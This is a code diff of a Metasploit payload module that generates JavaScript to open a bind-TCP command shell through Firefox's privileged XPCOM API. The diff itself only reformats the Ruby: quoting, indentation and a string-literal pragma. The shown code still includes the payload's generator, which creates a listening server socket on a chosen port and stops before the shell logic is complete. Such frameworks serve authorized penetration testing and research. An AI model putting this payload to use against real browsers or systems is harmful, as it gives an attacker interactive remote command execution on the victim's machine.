@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,7 +10,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Single
@@ -18,27 +18,26 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Command Shell, Bind TCP (via Firefox XPCOM script)',
-      'Description'   => %q{Creates an interactive shell via Javascript with access to Firefox's XPCOM API},
-      'Author'        => ['joev'],
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'firefox',
-      'Arch'          => ARCH_FIREFOX,
-      'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'firefox'
-    ))
+                     'Name'          => 'Command Shell, Bind TCP (via Firefox XPCOM script)',
+                     'Description'   => %q(Creates an interactive shell via Javascript with access to Firefox's XPCOM API),
+                     'Author'        => ['joev'],
+                     'License'       => BSD_LICENSE,
+                     'Platform'      => 'firefox',
+                     'Arch'          => ARCH_FIREFOX,
+                     'Handler'       => Msf::Handler::BindTcp,
+                     'Session'       => Msf::Sessions::CommandShell,
+                     'PayloadType'   => 'firefox'))
   end
 
   #
   # Returns the JS string to use for execution
   #
   def generate
-    %Q|
+    %|
     (function(){
       window = this;
       Components.utils.import("resource://gre/modules/NetUtil.jsm");
-      var lport = #{datastore["LPORT"]};
+      var lport = #{datastore['LPORT']};
       var rhost = "#{datastore['RHOST']}";
       var serverSocket = Components.classes["@mozilla.org/network/server-socket;1"]
                              .createInstance(Components.interfaces.nsIServerSocket);
